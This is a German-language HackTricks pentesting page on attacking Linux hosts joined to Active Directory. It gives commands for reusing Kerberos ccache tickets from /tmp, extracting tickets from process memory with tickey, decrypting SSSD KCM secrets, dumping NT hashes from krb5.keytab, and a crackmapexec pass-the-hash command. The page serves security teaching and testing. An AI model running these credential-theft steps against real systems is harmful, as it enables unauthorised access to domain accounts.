# Linux Active Directory

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks-Repository](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud-Repository](https://github.com/carlospolop/hacktricks-cloud) senden**.

</details>

Eine Linux-Maschine kann auch in einer Active Directory-Umgebung vorhanden sein.

Eine Linux-Maschine in einer AD kann **verschiedene CCACHE-Tickets in Dateien speichern. Diese Tickets können wie andere Kerberos-Tickets verwendet und missbraucht werden**. Um diese Tickets zu lesen, müssen Sie entweder der Benutzerbesitzer des Tickets oder **root** in der Maschine sein.

## Enumeration

### AD-Enumeration von Linux aus

Wenn Sie Zugriff auf eine AD in Linux (oder Bash in Windows) haben, können Sie versuchen, [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) zu verwenden, um die AD zu enumerieren.

Sie können auch die folgende Seite überprüfen, um **andere Möglichkeiten zur Enumeration von AD von Linux aus** zu erfahren:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA ist eine Open-Source-**Alternative** zu Microsoft Windows **Active Directory**, hauptsächlich für **Unix**-Umgebungen. Es kombiniert ein vollständiges **LDAP-Verzeichnis** mit einem MIT **Kerberos** Key Distribution Center für das Management ähnlich wie Active Directory. Mit dem Dogtag **Certificate System** für CA & RA-Zertifikatsverwaltung unterstützt es **Multi-Faktor-Authentifizierung**, einschließlich Smartcards. SSSD ist für Unix-Authentifizierungsprozesse integriert. Erfahren Sie mehr darüber in:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Spielen mit Tickets

### Pass The Ticket

Auf dieser Seite finden Sie verschiedene Orte, an denen Sie **Kerberos-Tickets in einem Linux-Host finden** könnten. Auf der folgenden Seite erfahren Sie, wie Sie diese CCache-Ticketformate in Kirbi (das Format, das Sie in Windows verwenden müssen) umwandeln und auch einen PTT-Angriff durchführen können:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### CCACHE-Ticket-Wiederverwendung aus /tmp

CCACHE-Dateien sind binäre Formate zum **Speichern von Kerberos-Anmeldeinformationen**, die normalerweise mit 600-Berechtigungen in `/tmp` gespeichert werden. Diese Dateien können anhand ihres **Namensformats `krb5cc_%{uid}`** identifiziert werden, das mit der Benutzer-UID korreliert. Für die Überprüfung des Authentifizierungstickets sollte die **Umgebungsvariable `KRB5CCNAME`** auf den Pfad der gewünschten Ticketdatei gesetzt sein, um deren Wiederverwendung zu ermöglichen.

Listen Sie das aktuelle Ticket für die Authentifizierung mit `env | grep KRB5CCNAME` auf. Das Format ist portabel und das Ticket kann **durch Setzen der Umgebungsvariable** mit `export KRB5CCNAME=/tmp/ticket.ccache` wiederverwendet werden. Das Format des Kerberos-Ticketnamens lautet `krb5cc_%{uid}`, wobei uid die Benutzer-UID ist.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### CCACHE Ticket-Wiederverwendung aus dem Schlüsselbund

**Kerberos-Tickets, die im Speicher eines Prozesses gespeichert sind, können extrahiert werden**, insbesondere wenn der ptrace-Schutz der Maschine deaktiviert ist (`/proc/sys/kernel/yama/ptrace_scope`). Ein nützliches Tool für diesen Zweck ist unter [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) zu finden, das die Extraktion erleichtert, indem es sich in Sitzungen einfügt und Tickets in `/tmp` ablegt.

Um dieses Tool zu konfigurieren und zu verwenden, werden die folgenden Schritte ausgeführt:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Diese Prozedur versucht, in verschiedene Sitzungen einzudringen und gibt den Erfolg durch Speicherung extrahierter Tickets in `/tmp` mit der Namenskonvention `__krb_UID.ccache` an.


### CCACHE-Ticket-Wiederverwendung von SSSD KCM

SSSD verwaltet eine Kopie der Datenbank im Pfad `/var/lib/sss/secrets/secrets.ldb`. Der entsprechende Schlüssel wird als versteckte Datei im Pfad `/var/lib/sss/secrets/.secrets.mkey` gespeichert. Standardmäßig ist der Schlüssel nur lesbar, wenn Sie **Root**-Berechtigungen haben.

Das Aufrufen von \*\*`SSSDKCMExtractor` \*\* mit den Parametern --database und --key analysiert die Datenbank und **entschlüsselt die Geheimnisse**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Der **Anmeldeinformationen-Cache-Kerberos-Blob kann in eine verwendbare Kerberos-CCache-Datei umgewandelt werden**, die an Mimikatz/Rubeus übergeben werden kann.

### Wiederverwendung von CCACHE-Tickets aus dem Keytab
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Extrahieren von Konten aus /etc/krb5.keytab

Dienstkontenschlüssel, die für Dienste mit Root-Berechtigungen erforderlich sind, werden sicher in **`/etc/krb5.keytab`**-Dateien gespeichert. Diese Schlüssel, die den Passwörtern für Dienste ähneln, erfordern eine strenge Vertraulichkeit.

Um den Inhalt der Keytab-Datei zu überprüfen, kann **`klist`** verwendet werden. Das Tool ist darauf ausgelegt, Details zu den Schlüsseln anzuzeigen, einschließlich des **NT-Hashes** für die Benutzerauthentifizierung, insbesondere wenn der Schlüsseltyp als 23 identifiziert wird.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Für Linux-Benutzer bietet **`KeyTabExtract`** die Möglichkeit, den RC4 HMAC-Hash zu extrahieren, der für die Wiederverwendung des NTLM-Hashes genutzt werden kann.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Auf macOS dient **`bifrost`** als Tool zur Analyse von Keytab-Dateien.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Unter Verwendung der extrahierten Konten- und Hash-Informationen können Verbindungen zu Servern mithilfe von Tools wie **`crackmapexec`** hergestellt werden.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Referenzen
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>
